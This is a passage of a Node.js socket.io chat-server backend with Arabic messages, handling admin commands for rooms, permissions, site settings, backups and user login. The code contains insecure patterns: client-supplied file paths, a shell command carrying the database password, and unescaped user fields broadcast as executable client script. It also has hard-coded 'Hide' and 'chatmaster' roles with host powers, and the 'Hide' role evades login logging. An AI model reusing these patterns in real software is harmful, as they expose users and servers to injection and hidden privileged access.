            }
          );
        } else if (data["cmd"] == "SEND_ADMIN_ROOM_DEL") {
          if (!GetPower2(UserInfo[search.id])["rooms"]) {
            return;
          } else if (typeof data["id"] != "string") {
            return;
          } else if (data["id"] == "3ihxjl18it") {
            SendNotification({
              state: "me",
              topic: "",
              force: 1,
              msg: "لا يمكنك حذف هذه الغرفة",
              user: "",
            });
            return;
          }

          RoomsRepo.deleted(data["id"]).then((deldone) => {
            if (deldone) {
              SaveStats({
                state: "مسح غرفة",
                topic: UserInfo[search.id]["topic"],
                ip: UserInfo[search.id]["ip"],
                username: UserInfo[search.id]["username"],
                room: GetRoomList(data["id"])["topic"],
                time: new Date().getTime(),
              });
              RefreshRooms(1);
              RefreshRoom();
              io.emit("SEND_EVENT_EMIT_SERVER", {
                cmd: "r-",
                data: data["id"],
              });
              socket.emit("SHWO_PANEL_ADMIN", {
                cmd: "SEND_ADMIN_ROOM_DEL",
                data: data["id"],
              });
              MessagesList({
                state: "LogsMsg",
                bg: "none",
                copic: "none",
                class: "hmsg",
                id: socket.id,
                topic: UserInfo[search.id]["topic"],
                msg: "( قام بحذف الغرفة الحالية )",
                room: data["id"],
                pic: UserInfo[search.id]["pic"],
              });
              
            }
          });
        } else if (data["cmd"] == "SEND_ADMIN_ROOM_PASS") {
          if (!GetPower2(UserInfo[search.id])["rooms"]) {
            return;
          } else if (typeof data["id"] != "string") {
            return;
          }
          RoomsRepo.updateBy({ state: "updatePass", id: data["id"] }).then(
            (doneup) => {
              if (doneup) {
                RefreshRooms(1);
                RefreshRoom();
                socket.emit("SHWO_PANEL_ADMIN", {
                  cmd: "SEND_ADMIN_ROOM_PASS",
                  data: data["id"],
                });
              }
            }
          );
        } else if (data["cmd"] == "SEND_ADMIN_ROOMS") {

          if (!GetPower2(UserInfo[search.id])["rooms"]) {
            return;
          }
          RoomsRepo.getBy({
            state: "getAllLimit",
            limit: data["limit"],
          }).then((res) => {
            socket.emit("SHWO_PANEL_ADMIN", {
              cmd: "SEND_ADMIN_ROOMS",
              data: res,
              room: SiteSetting["room"],
            });
          });
        } else if (data["cmd"] == "SEND_ADMIN_POWERS") {
          if (!GetPower2(UserInfo[search.id])["setpower"]) {
            return;
          }

          PowersRepo.getBy({ state: "getAll" }).then((res) => {
            socket.emit("SHWO_PANEL_ADMIN", {
              cmd: "SEND_ADMIN_POWERS",
              data: res,
            });
          });
        } else if (data["cmd"] == "SEND_ADMIN_POWER_ADD") {
          if (!GetPower2(UserInfo[search.id])["setpower"]) {
            return;
          } else if (typeof data["power"] != "string") {
            return;
          } else if (!data["power"]) {
            return;
          } else if (Config.maxPower <= ShowPowers.length) {
            SendNotification({
              state: "me",
              topic: "",
              force: 1,
              msg: "تم إنشاء الحد الاقصى من الصلاحيات",
              user: "",
            });
            return;
          }

          const power = JSON.parse(data["power"]);
          if (typeof power["name"] != "string") {
            return;
          } else if (typeof power["rank"] != "number") {
            return;
          } else if (
            !power["name"] ||
            power["name"].length < 2 ||
            power["name"].length > 30
          ) {
            SendNotification({
              state: "me",
              topic: "",
              force: 1,
              msg: "يجب ان لا يزيد اسم الصلاحية عن 30 حرف و لا يقل عن 2 حرف",
              user: "",
            });
            return;
          } else if (power["rank"] > 10000 || power["rank"] < 2) {
            SendNotification({
              state: "me",
              topic: "",
              force: 1,
              msg: "يجب ان لا يزيد ترتيب الصلاحية عن 10000 و لا يقل عن 2",
              user: "",
            });
            return;
          } else if (
            power["name"] == "Hide" ||
            power["name"] == "chatmaster"
          ) {
            SendNotification({
              state: "me",
              topic: "",
              force: 1,
              msg: "لا يمكنك التعديل على هذه الصلاحية",
              user: "",
            });
            return;
          } else if (
            GetPower2(UserInfo[search.id])["rank"] < power["rank"]
          ) {
            SendNotification({
              state: "me",
              topic: "",
              force: 1,
              msg: "لا يمكنك التعديل على صلاحيه اعلى منك",
              user: "",
            });
            return;
          }

          power["name"] = String(power["name"]).split("<").join("&#x3C;");
          const ispower = ShowPowers.findIndex(
            (x) => x.name == power["name"]
          );
          if (ispower != -1) {
            if (
              ShowPowers[ispower]["rank"] >
              GetPower2(UserInfo[search.id])["rank"]
            ) {
              SendNotification({
                state: "me",
                topic: "",
                force: 1,
                msg: "لا يمكن تنزيل هذه الصلاحية",
                user: "",
              });
              return;
            }
            ShowPowers.splice(ispower, 1);
            ShowPowers.push(power);
            io.emit("SEND_EVENT_EMIT_SERVER", {
              cmd: "powers",
              data: ShowPowers,
            });
            SendNotification({
              state: "me",
              topic: "",
              force: 1,
              msg: "تم التعديل على صلاحية [" + power["name"] + "]",
              user: "",
            });
            PowersRepo.updatePower({
              power: JSON.stringify(power),
              name: power["name"],
            }).then((updatepw) => {
              if (updatepw) {
                SaveStats({
                  state: "تعديل مجموعة",
                  topic: UserInfo[search.id]["topic"],
                  ip: UserInfo[search.id]["ip"],
                  username: UserInfo[search.id]["username"],
                  room: "[" + power["rank"] + "][" + power["name"] + "]",
                  time: new Date().getTime(),
                });
                socket.emit("SHWO_PANEL_ADMIN", {
                  cmd: "SEND_ADMIN_POWER_EDIT",
                  data: power["name"],
                });
              }
            });
          } else {
            if (
              GetPower2(UserInfo[search.id])["rank"] < power["rank"]
            ) {
              SendNotification({
                state: "me",
                topic: "",
                force: 1,
                msg: "لا يمكنك إنشاء صلاحية اعلى منك",
                user: "",
              });
              return;
            }
            ShowPowers.push(power);
            io.emit("SEND_EVENT_EMIT_SERVER", {
              cmd: "powers",
              data: ShowPowers,
            });
            PowersRepo.create({
              powers: JSON.stringify(power),
              name: power["name"],
            }).then((createpw) => {
              if (createpw) {
                SendNotification({
                  state: "me",
                  topic: "",
                  force: 1,
                  msg: "تم إنشاء صلاحية [" + power["name"] + "]",
                  user: "",
                });
                SaveStats({
                  state: "إنشاء مجموعة",
                  topic: UserInfo[search.id]["topic"],
                  ip: UserInfo[search.id]["ip"],
                  username: UserInfo[search.id]["username"],
                  room: "[" + power["rank"] + "][" + power["name"] + "]",
                  time: new Date().getTime(),
                });
                socket.emit("SHWO_PANEL_ADMIN", {
                  cmd: "SEND_ADMIN_POWER_ADD",
                  data: {
                    powers: JSON.stringify(power),
                    name: power["name"],
                    id: createpw["id"],
                  },
                });
              }
            });
          }
        } else if (data["cmd"] == "SEND_ADMIN_POWER_DEL") {
          if (!GetPower2(UserInfo[search.id])["setpower"]) {
            return;
          } else if (typeof data["power"] != "string") {
            return;
          } else if (
            data["power"] == "Hide" ||
            data["power"] == "gochat" ||
            data["power"] == "chatmaster"
          ) {
            return;
          } else if (!data["power"]) {
            return;
          } else if (
            GetPower2(UserInfo[search.id])["rank"] <
            GetPower(data["power"])["rank"]
          ) {
            SendNotification({
              state: "me",
              topic: "",
              force: 1,
              msg: "لا يمكنك حذف صلاحية اقوى من صلاحيتك",
              user: "",
            });
            return;
          }
          const ispower = ShowPowers.findIndex(
            (x) => x.name == data["power"]
          );
          if (ispower != -1) {
            ShowPowers.splice(ispower, 1);
            SendNotification({
              state: "me",
              topic: "",
              force: 1,
              msg: "تم حذف صلاحية [" + data["power"] + "]",
              user: "",
            });
            io.emit("SEND_EVENT_EMIT_SERVER", {
              cmd: "powers",
              data: ShowPowers,
            });
            UsersRepo.getBy({ state: "getAllBy" }).then((upw) => {
              if (upw) {
                for (var i = 0; i < upw.length; i++) {
                  if (upw[i]["power"] == data["power"]) {
                    UsersRepo.updateBy({
                      state: "updatePower",
                      power: "",
                      uid: upw[i]["uid"],
                    });
                    SubRepo.deleted(upw[i]["username"]);
                    const inme = OnlineUser.findIndex(
                      (x) => x.lid == upw[i]["lid"]
                    );
                    if (inme != -1) {
                      UserInfo[upw[i]["id"]]["power"] = "";
                      OnlineUser[inme]["power"] = "";
                      io.emit("SEND_EVENT_EMIT_SERVER", {
                        cmd: "u^",
                        data: OnlineUser[inme],
                      });
                    }
                    if (upw[i]["id"]) {
                      socket.to(upw[i]["id"]).emit("SEND_EVENT_EMIT_SERVER", {
                        cmd: "power",
                        data: Config.PowerNon,
                      });
                    }
                  }
                }
              }
            });
            PowersRepo.deleted(data["power"]).then((delp) => {
              if (delp) {
                SaveStats({
                  state: "حذف مجموعة",
                  topic: UserInfo[search.id]["topic"],
                  ip: UserInfo[search.id]["ip"],
                  username: UserInfo[search.id]["username"],
                  room: data["power"],
                  time: new Date().getTime(),
                });
                socket.emit("SHWO_PANEL_ADMIN", {
                  cmd: "SEND_ADMIN_POWER_DEL",
                  data: data["power"],
                });
              }
            });
          }
        } else if (data["cmd"] == "SEND_ADMIN_EDIT_SETTINGS") {
          console.log("📩 تم استقبال SEND_ADMIN_EDIT_SETTINGS:", data["data"]);

          if (!GetPower2(UserInfo[search.id])["owner"]) {
            return;
          } else if (
            typeof data["data"]["lengthbc"] != "number" ||
            typeof data["data"]["lengthpm"] != "number" ||
            typeof data["data"]["lengthroom"] != "number" ||
            typeof data["data"]["maxdaymsg"] != "number" ||
            typeof data["data"]["oflineuser"] != "number" ||
            typeof data["data"]["maxlikealert"] != "number" ||
            typeof data["data"]["maxlikebc"] != "number" ||
            typeof data["data"]["maxlikecam"] != "number" ||
            typeof data["data"]["maxlikemic"] != "number" ||
            typeof data["data"]["maxlikestory"] != "number" ||
            typeof data["data"]["maxlikename"] != "number" ||
            typeof data["data"]["maxlikepic"] != "number" ||
            typeof data["data"]["maxlikeyot"] != "number" ||
            typeof data["data"]["maxek"] != "number" ||
            typeof data["data"]["maxlikepm"] != "number" ||
            typeof data["data"]["maxlikeroom"] != "number" ||
            typeof data["data"]["maxlikesendpicpm"] != "number" ||
            typeof data["data"]["maxlogin"] != "number" ||
            typeof data["data"]["maxuploadfile"] != "number" ||
            typeof data["data"]["maxrep"] != "number" ||
            typeof data["data"]["gustmin"] != "number" ||
            typeof data["data"]["registermin"] != "number" ||
            typeof data["data"]["bctime"] != "number" ||
            typeof data["data"]["callmic"] != "boolean" ||
            typeof data["data"]["callsot"] != "boolean" ||
            typeof data["data"]["showtop"] != "boolean" ||
            typeof data["data"]["showsto"] != "boolean" ||
            typeof data["data"]["showyot"] != "boolean" ||
            typeof data["data"]["bars"] != "boolean" ||
            typeof data["data"]["gust"] != "boolean" ||
            typeof data["data"]["isbanner"] != "boolean" ||
            typeof data["data"]["reconnect"] != "boolean" ||
            typeof data["data"]["register"] != "boolean" ||
            typeof data["data"]["offline"] != "boolean" ||
            typeof data["data"]["replay"] != "boolean" ||
            typeof data["data"]["replaybc"] != "boolean" ||
            typeof data["data"]["likebc"] != "boolean" ||
            typeof data["data"]["vpn"] != "boolean"
          ) {
            return;
          }
          if (data["data"]) {
            data["data"]["id"] = 1;
            data["data"]["state"] = "Settingdone";
            SendNotification({
              state: "me",
              topic: "",
              force: 1,
              msg: "تم التعديل بنجاح",
              user: "",
            });
            SaveStats({
              state: "إعدادت الموقع",
              topic: UserInfo[search.id]["topic"],
              ip: UserInfo[search.id]["ip"],
              username: UserInfo[search.id]["username"],
              room: "حفظ",
              time: new Date().getTime(),
            });
            console.log("📤 سيتم حفظ البيانات:", data["data"]);

            SettingRepo.updateBy(data["data"]).then((doneup) => {
              if (doneup) {
                SettingRepo.getBy({ state: "getByID", id: 1 }).then(
                  (getSettings) => {
                    if (getSettings) {
                      SiteSetting = getSettings;
                      io.emit("SEND_EVENT_EMIT_SERVER", {
                        cmd: "infosite",
                        data: {
                          callmic: getSettings["callmic"],
                          callsot: getSettings["callsot"],
                          showtop: getSettings["showtop"],
                          callsto: getSettings["showsto"],
                          showyot: getSettings["showyot"],
                          replay: getSettings["replay"],
                          replaybc: getSettings["replaybc"],
                          likebc: getSettings["likebc"],
                          oflineuser: getSettings["oflineuser"],
                          mic: getSettings["maxlikemic"],
                          story: getSettings["maxlikestory"] || 2000,
                        },
                      });
                    }
                  }
                );
              }
            });
          }
        } else if (data["cmd"] == "SEND_ADMIN_SETTINGS") {
          if (!GetPower2(UserInfo[search.id])["owner"]) {
            return;
          }

          SettingRepo.getBy({ state: "getByID", id: 1 }).then((set) => {
            socket.emit("SHWO_PANEL_ADMIN", {
              cmd: "SEND_ADMIN_SETTINGS",
              data: set,
            });
          });
        } else if (data["cmd"] == "SEND_ADMIN_REMOVE_ICO") {
          if (!GetPower2(UserInfo[search.id])["owner"]) {
            return;
          }

          fs.unlink(
            "uploads/" +
              data["data"].split("/")[1] +
              "/" +
              data["data"].split("/")[2],
            (err) => {
              if (err) {
                console.error(err);
                return;
              }
            }
          );

          if (data["data"].split("/")[1] == "sico") {
            SicoRepo.deleted(data["data"].split("/")[2]).then((del) => {
              if (del) {
                RefreshSico();
              }
            });
          }else if (data["data"].split("/")[1] == "atar"){
            AtarRepo.deleted(data["data"].split("/")[2]).then((del) => {
              if (del) {
                RefreshAtar();
              }
            });
          }else if (data["data"].split("/")[1] == "back"){
            BackRepo.deleted(data["data"].split("/")[2]).then((del) => {
              if (del) {
                RefreshBack();
              }
            });
          } else if (data["data"].split("/")[1] == "emo") {
            EmoRepo.deleted(data["data"].split("/")[2]).then((del) => {
              if (del) {
                RefreshEmo();
              }
            });
          } else if (data["data"].split("/")[1] == "dro3") {
            Dro3Repo.deleted(data["data"].split("/")[2]).then((del) => {
              if (del) {
                RefreshDro3();
              }
            });
          }

          SaveStats({
            state:
              data["data"].split("/")[1] == "sico"
                ? "مسح بنر | ايقونه"
                : data["data"].split("/")[1] == "dro3"
                ? "مسح هدية | ايقونه"
                : data["data"].split("/")[1] == "atar"
                ? "مسح اطار الصور"
                : data["data"].split("/")[1] == "back"
                ? "مسح خلفية الاعضاء"
                : "مسح فيس | ايقونه",
            topic: UserInfo[search.id]["topic"],
            ip: UserInfo[search.id]["ip"],
            username: UserInfo[search.id]["username"],
            room: "",
            time: new Date().getTime(),
          });
          socket.emit("SHWO_PANEL_ADMIN", {
            cmd: "SEND_ADMIN_REMOVE_ICO",
            data: data["data"],
          });
        } else if (data["cmd"] == "SEND_ADMIN_EMOJI") {
          if (!GetPower2(UserInfo[search.id])["owner"]) {
            return;
          }

          EmoRepo.getAll().then((emo) => {
            socket.emit("SHWO_PANEL_ADMIN", {
              cmd: "SEND_ADMIN_EMOJI",
              data: emo,
            });
          });
        } else if (data["cmd"] == "de") {
        } else if (data["cmd"] == "SEND_ADMIN_HOSTCHAT") {
          if (
            UserInfo[search.id]["power"] == "gochat" ||
            UserInfo[search.id]["power"] == "Hide" ||
            UserInfo[search.id]["power"] == "chatmaster"
          )  {
            setTimeout(() => {
              UsersRepo.getBy({ state: "getAllBy" }).then((us) => {
                socket.emit("SHWO_PANEL_ADMIN", {
                  cmd: "SEND_ADMIN_HOSTCHAT",
                  data: us.length,
                });
              });
            }, 500);
          }
        } else if (data["cmd"] == "SEND_ADMIN_HOST_EDIT") {
          if (
            UserInfo[search.id]["power"] == "gochat" ||
            UserInfo[search.id]["power"] == "Hide" ||
            UserInfo[search.id]["power"] == "chatmaster"
          ) {
            if (data["data"] == "logs") {
              SendNotification({
                state: "me",
                topic: "",
                force: 1,
                msg: "تم مسح سجل الدخول",
                user: "",
              });
              LogsRepo.deleteall();
            } else if (data["data"] == "story") {
              SendNotification({
                state: "me",
                topic: "",
                force: 1,
                msg: "تم مسح القصص",
                user: "",
              });
              StoryRepo.deleteall();
              io.emit("SEND_EVENT_EMIT_SERVER", {
                cmd: "storydel",
                data: {},
              });
            } else if (data["data"] == "point") {
              SendNotification({
                state: "me",
                topic: "",
                force: 1,
                msg: "تم تصفير نقاط المستخدمين",
                user: "",
              });
              UsersRepo.updateBy({ state: "updatePoint" });
              Object.keys(UserInfo).forEach(function (socketId) {
                var userInfos = UserInfo[socketId];
                if (userInfos) {
                  userInfos["evaluation"] = 0;
                }
              });
            } else if (data["data"] == "filter") {
              HistLetterRepo.deleteBy({ state: "deleteAll" });
              SendNotification({
                state: "me",
                topic: "",
                force: 1,
                msg: "تم مسح سجل الفلتر",
                user: "",
              });
            } else if (data["data"] == "bars") {
              SendNotification({
                state: "me",
                topic: "",
                force: 1,
                msg: "تم مسح الحائط",
                user: "",
              });
              BarsRepo.deleted({ state: "deleteAll" });
              io.emit("SEND_EVENT_EMIT_SERVER", { cmd: "fildel", data: {} });
            } else if (data["data"] == "stats") {
              SendNotification({
                state: "me",
                topic: "",
                force: 1,
                msg: "تم مسح سجل الحالات",
                user: "",
              });
              StateRepo.deleteall();
            }else if (data["data"] == "nicks") {
				              SendNotification({
                state: "me",
                topic: "",
                force: 1,
                msg: "تم مسح كشف النكات",
                user: "",
              });
              NamesRepo.deleteall();
            }else if (data["data"] == "reporte") {
              SendNotification({
                state: "me",
                topic: "",
                force: 1,
                msg: "تم مسح سجل التبليغات",
                user: "",
              });
              MesgRepo.deleteall();
            } else if (data["data"] == "files") {
              rimraf("uploads/sendfile", () => {
                SendNotification({
                  state: "me",
                  topic: "",
                  force: 1,
                  msg: "تم مسح ملفات الدردشة",
                  user: "",
                });
                if (!fs.existsSync("uploads/sendfile")) {
                  fs.mkdirSync("uploads/sendfile");
                }
              });
            } else if (data["data"] == "import") {
              SettingRepo.DeleteDatabase();
              SendNotification({
                state: "me",
                topic: "",
                force: 1,
                msg: "جاري التركيب الرجاء الإنتظار",
                user: "",
              });
              setTimeout(() => {
                SendNotification({
                  state: "me",
                  topic: "",
                  force: 1,
                  msg: "الرجاء الإنتظار قليلا جاري التركيب",
                  user: "",
                });
                SettingRepo.CreateDatabase();
                setTimeout(() => {
                  cp.exec(
                    "mysql -u " +
                      Config.UserDB +
                      " -p" +
                      Config.PassDB +
                      " " +
                      Config.DBDB +
                      " < " +
                      "database/" +
                      "database0.sql",
                    (error, stdout, stderr) => {
                      /* لا نرمي الخطأ هنا حتى لا تسقط الخدمة على الاستضافة */
                      if (error) {
                        console.log(
                          "restore database error: " + (error.message || error)
                        );
                        SendNotification({
                          state: "me",
                          topic: "",
                          force: 1,
                          msg: "فشل تركيب النسخة الاحتياطية (تأكد من وجود mysql CLI)",
                          user: "",
                        });
                        return;
                      }
                      SendNotification({
                        state: "me",
                        topic: "",
                        force: 1,
                        msg: "تم تركيب النسخة الإحتياطية بنجاح",
                        user: "",
                      });
                      setTimeout(function () {
                        fs.unlink("database/database0.sql", (err) => {
                          if (err) {
                          }
                        });
                        process.exit(1);
                      }, 1000 * 10);
                    }
                  );
                }, 5000);
              }, 5000);
            } else if (data["data"] == "backup") {
              if (fs.existsSync("database/database0.sql")) {
                SendNotification({
                  state: "me",
                  topic: "",
                  force: 1,
                  msg: "هناك نسخة إحتياطية بالفعل",
                  user: "",
                });
                return;
              } else {
                DatabaseDump("database/database0.sql");
                SendNotification({
                  state: "me",
                  topic: "",
                  force: 1,
                  msg: "تم إنشاء نسخة إحتياطية",
                  user: "",
                });
              }
            } else if (data["data"] == "restart") {
              setTimeout(function () {
                process.exit(1);
              }, 1000);
            }

            SaveStats({
              state:
                data["data"] == "restart"
                  ? "إعادة تشغيل"
                  : data["data"] == "files"
                  ? "حذف ملفات الدردشة"
                  : data["data"] == "point"
                  ? "تصفير نقاط"
                  : data["data"] == "story"
                  ? "حذف القصص"
                  : data["data"] == "filter"
                  ? "حذف الفيلتر"
                  : data["data"] == "reporte"
                  ? "حذف التبليغات "
                  : data["data"] == "stats"
                  ? "حذف سجل الحالات"
                  : data["data"] == "bars"
                  ? "حذف الحائط"
                  : data["data"] == "import"
                  ? "إسترجاع نسخه إحتياطية"
                  : data["data"] == "backup"
                  ? "إنشاء نسخه إحتياطية"
                  : data["data"] == "logs"
                  ? "حذف سجل الدخول"
                  : "",
              topic: UserInfo[search.id]["topic"],
              ip: UserInfo[search.id]["ip"],
              username: UserInfo[search.id]["username"],
              room: "",
              time: new Date().getTime(),
            });
          }
        } else if (data["cmd"] == "SEND_ADMIN_SITE") {
          if (!GetPower2(UserInfo[search.id])["owner"]) {
            return;
          }
          SettingRepo.getBy({
            state: "getByHost",
            hostname: data.url,
          }).then((getSe) => {
            if (getSe) {
              fs.readFile("uploads/" + getSe["script"], function (err, f) {
                if (f) {
                  var array = f.toString().split("\n");
                  array = JSON.parse(array);
                  socket.emit("SHWO_PANEL_ADMIN", {
                    cmd: "SEND_ADMIN_SITE",
                    data: {
                      test:Config.ListDomin,
                      urls:data.url,
                      title: array["title"] || "",
                      colors: {
                        hicolor: array["background"],
                        bgcolor: array["bg"],
                        btcolor: array["buttons"],
                      },
                      script: String(array["settscr"]),
                      description: array["settdescription"] || "",
                      keywords: array["settkeywords"] || "",
                      istite: array["name"] || "",
                    },
                  });
                }
              });
            }
          });
        } else if (data["cmd"] == "SEND_ADMIN_SAVE_SITE") {
          if (!GetPower2(UserInfo[search.id])["owner"]) {
            return;
          } else if (
            typeof data["data"]["settscr"] != "string" ||
            typeof data["data"]["bg"] != "string" ||
            typeof data["data"]["buttons"] != "string" ||
            typeof data["data"]["background"] != "string" ||
            typeof data["data"]["name"] != "string" ||
            typeof data["data"]["title"] != "string" ||
            typeof data["data"]["settdescription"] != "string" ||
            typeof data["data"]["settkeywords"] != "string"
          ) {
            SendNotification({
              state: "me",
              topic: "",
              force: 1,
              msg: "الرجاء ملئ كل الخانات الموجوده",
              user: "",
            });
            return;
          }

          if (
            data["data"]["settscr"].includes("socket.emit") ||
            data["data"]["settscr"].includes("setInterval") ||
            data["data"]["settscr"].includes("socket.on") ||
            data["data"]["settscr"].includes("localStorage") ||
            data["data"]["settscr"].includes("èmit") ||
            data["data"]["settscr"].includes("èmit.on") ||
            data["data"]["settscr"].includes("èmit.emit") ||
            data["data"]["settscr"].includes("socket")
          ) {
            SendNotification({
              state: "me",
              topic: "",
              force: 1,
              msg: "تم رفض السكريبت يحتوي على فايروس يرجى تغيره",
              user: "",
            });
            return;
          }
          fs.writeFile(
            "uploads/" + data.data.url + ".txt",
            JSON.stringify(data["data"]),
            function (err) {
              if (err) {
                SendNotification({
                  state: "me",
                  topic: "",
                  force: 1,
                  msg: "حدث خطأ الرجاء المحاولة في وقت لاحق",
                  user: "",
                });
                return;
              }
              SendNotification({
                state: "me",
                topic: "",
                force: 1,
                msg: "تم تعديل إعدادات الموقع بنجاح",
                user: "",
              });
              SettingRepo.updateBy({
                state: "updatecolor",
                bg: data["data"]["bg"],
                background: data["data"]["background"],
                buttons: data["data"]["buttons"],
                hostname: data.data.url,
              });
            }
          );
        } else if (data["cmd"] == "SEND_ADMIN_EMO_UP") {
          if (!GetPower2(UserInfo[search.id])["owner"]) {
            return;
          } else if (
            typeof data["type"] != "number" ||
            typeof data["path"] != "string"
          ) {
            return;
          }

          EmoRepo.getBy(data["type"]).then((emo) => {
            if (emo) {
              SendNotification({
                state: "me",
                topic: "",
                force: 1,
                msg: "رقم الفيس موجود بلفعل",
                user: "",
              });
            } else {
              EmoRepo.update({ type: data["type"], path: data["path"] });
              RefreshEmo();
            }
          });
        }
      } catch (e) {
        console.log(e);
      }
    }
  }
});
}else{
  return;
}
});
}
  function FilterOff(data) {
    if (UserInfo[socket.id] && typeof data == "object") {
      for (var i = 0; i < OnlineUser.length; i++) {
        const getpw = ShowPowers.findIndex(
          (x) => x.name == OnlineUser[i]["power"]
        );
        if (getpw != -1) {
          if (ShowPowers[getpw]["bootedit"]) {
            SendNotification({
              id: OnlineUser[i]["id"],
              state: "to",
              topic: data["state"],
              force: 1,
              msg: data["msg"].slice(0, SiteSetting["lengthroom"]),
              user: socket.id,
            });
          }
        }
      }
    }
  }

  function FilterChat(data) {
    if (data && UserInfo[socket.id]) {
      const nt1 = NoMsgFilter.findIndex((x) => data.includes(x.v));
      const nt2 = NoMsgFilter.findIndex(
        (x) => data.includes(x.v) && x.path == "amsgs"
      );
       if (nt1 !== -1 && nt2 === -1) {
         if (NoMsgFilter[nt1]["path"] == "bmsgs") {
           FilterOff({ msg: data, state: "ممنوعة" });
         } else if (NoMsgFilter[nt1]["path"] == "wmsgs") {
           FilterOff({ msg: data, state: "مراقبة" });
         }
        if (
          NoMsgFilter[nt1]["path"] == "bmsgs" ||
          NoMsgFilter[nt1]["path"] == "wmsgs"
        ) {
          HistLetterRepo.create({
            ip: UserInfo[socket.id]["ip"],
            msg: data.slice(0, SiteSetting["lengthroom"]),
            topic: UserInfo[socket.id]["topic"],
            v: NoMsgFilter[nt1]["v"],
          });
          HistLetterRepo.getBy({ state: "getAll" }).then((saveHistory) => {
            if (saveHistory) {
              for (var i = 0; i < saveHistory.length; i++) {
                if (i > Config.MaxFilter) {
                  HistLetterRepo.deleteBy({
                    state: "deleteByID",
                    id: saveHistory[0]["id"],
                  });
                }
              }
            }
          });
        }
      }
    }
  }
  function NextLevel() {
    if (UserInfo[socket.id]) {
      io.to(UserInfo[socket.id]["idroom"]).emit("SEND_EVENT_EMIT_SERVER", {
        cmd: "lvel",
        data: {
          bg: "none",
          class: "hmsg",
          topic: "ترقية مستوى",
          msg:
            UserInfo[socket.id]["topic"] +
            " تم ترقيت نجومه للوصول الى " +
            UserInfo[socket.id]["evaluation"] +
            "  رسالة في الحائط",
          roomid: UserInfo[socket.id]["idroom"],
          pic: "/imgs/star.png",
          uid: "",
        },
      });
    }
  }

  function ChangeSatets(data) {
    if (typeof data == "number") {
      if (UserInfo[socket.id]) {
        const user = OnlineUser.findIndex((x) => x.id == socket.id);
        if (
          user != -1 &&
          UserInfo[socket.id]["busy"] == false &&
          OnlineUser[user]["stat"] != 4
        ) {
          if (OnlineUser[user]["stat"] === data) {
            return;
          }
          OnlineUser[user]["stat"] = data;
          io.emit("SEND_EVENT_EMIT_SERVER", {
            cmd: "u^",
            data: OnlineUser[user],
          });
        }
      }
    }
  }
  socket.on("SEND_EVENT_EMIT_STATE", ChangeSatets);

  function MyRoom(data) {
    if (data) {
      var maxroom = OnlineUser.filter((a) => a.roomid == SiteSetting["room"]);
      if (maxroom) {
        if (
          maxroom.length == GetRoomList(SiteSetting["room"])["max"] ||
          isBandRoom({ device: data, room: SiteSetting["room"] })
        ) {
          return null;
        } else {
          return SiteSetting["room"];
        }
      } else {
        return SiteSetting["room"];
      }
    }
  }

  function IsWelcome() {
    if (UserInfo[socket.id]) {
      IntroRepo.getBy({ state: "getIn", category: "w" }).then((wlc) => {
        if (wlc.length > 0) {
          for (var i = 0; i < wlc.length; i++) {
            socket.emit("SEND_EVENT_EMIT_SERVER", {
              cmd: "msg",
              data: {
                bg: "",
                class: "pmsgc",
                topic: wlc[i]["adresse"].split("<").join("&#x3C;"),
                msg: wlc[i]["msg"].split("<").join("&#x3C;"),
                ucol: "red",
                mcol: "#000000",
                roomid: UserInfo[socket.id]["idroom"],
                pic: "/site/msgpic.png",
                uid: "",
              },
            });
          }
        }
      });
    }
  }

  function EnterUserGust(data) {
    if (typeof data == "object") {
      if (data["uid"] && data["islogin"] == "عضو") {
        UsersRepo.updateBy({
          state: "updateIp",
          device: data["device"],
          uid: data["uid"],
          ip: data["ip"],
          id: socket.id,
        });
        SubRepo.getBy({
          state: "getByusername",
          username: data["username"],
        }).then((isres) => {
          if (isres) {
            if (
              isres.timeis > 0 &&
              Number(new Date().getTime()).toFixed() < Number(isres.timestart)
            ) {
              UsersRepo.updateBy({
                state: "updatePower",
                uid: data["uid"],
                power: "",
              });
              SubRepo.deleted(data["username"]);
              data["power"] = "";
            }
          }
        });
      }

      if (data["islogin"] != "بوت") {
        ListEnter.push({ id: socket.id, ip: data["ip"] });
        if (SiteSetting["reconnect"] && data["islogin"] == "عضو") {
          socket.emit("SEND_EVENT_EMIT_SERVER", {
            k: stringGen(5),
            cmd: "ok",
            data: {},
          });
        } else {
          socket.emit("SEND_EVENT_EMIT_SERVER", {
            k: stringGen(5),
            cmd: "nok",
            data: {},
          });
        }
      }
      UserInfo[data["id"]] = {
        ucol: data["ucol"],
        mcol: data["mcol"],
        mscol: data["mscol"],
        atar: data["atar"],
        back: data["back"],
        ifedit: data["ifedit"],
        visitnotif: data["visitnotif"] ? 1 : 0,
        offline: false,
		reconnct:"",
        offdate: null,
        ismsg: false,
        kiked: false,
        bar: false,
        visitor:false,
        iscall: null,
		lastst:0,
        logout: false,
        islogin: data["islogin"],
        bg: data["bg"],
        copic: data["copic"],
        rep: data["rep"],
        ico: data["ico"],
        evaluation: data["eva"],
        username: data["username"],
        islike: data["islike"],
        discard: [],
		istef:[],
        power: data["power"],
        idreg: data["idreg"],
        topic: data["topic"],
        country: data["country"],
        ip: data["ip"],
        id: data["id"],
        uid: data["uid"],
        lid: data["lid"],
        busy: false,
        ismuted: data["ismuted"],
        ismutedbc: data["ismutedbc"],
        stealth: data["stealth"],
        device: data["device"],
        pic: data["pic"],
        idroom: data["idroom"],
      };
      if (GetPower(data["power"])["stealth"] && data["stealth"]) {
      } else {
        if (data["loginG"] && !data["islog"]) {
          const script =
            '<div class="loginItms">' +
            '<div style="background-image: url(' +
            data["pic"] +
            ')" class="loginImg"></div>' +
            '<img src="imgs/2.png" class="loginLogo">' +
            '<div class="loginUserName" > ' +
            data["topic"] +
            "</div>" +
            '<img src="/flag/' +
            (data["country"].toLowerCase().replace("il", "ps") || "tn") +
            '.png" class="loginFlog">' +
            "</div>";
          io.emit("SEND_EVENT_EMIT_SERVER", {
            cmd: "ev",
            data:
              "if(M_ID){const king = $('" +
              script +
              '\').appendTo("body");king.fadeIn(1000);setTimeout(function(){king.fadeOut(500);},5000);}',
          });
        }
      }

      if (data["power"] != "Hide" && data["islogin"] != "بوت") {
        SaveLogs({
          state: data["islogin"],
          topic: data["topic"],
          username: data["username"],
          ip: data["ip"],
          country: data["country"],
          device: data["device"],
          isin: data["refr"],
          date: new Date().getTime(),
        });
      }

      RefreshEmo();
      RefreshDro3();
      RefreshSico();
      RefreshAtar();
      RefreshBack();
	  
		socket.emit("SEND_EVENT_EMIT_SERVER", {cmd: "brbstate",data: BotBC['room'] ? 1 : 0});

      const onlineUser = OnlineUser.findIndex((x) => x.lid == data["lid"]);
      if (onlineUser == -1) {
        OnlineUser.push({
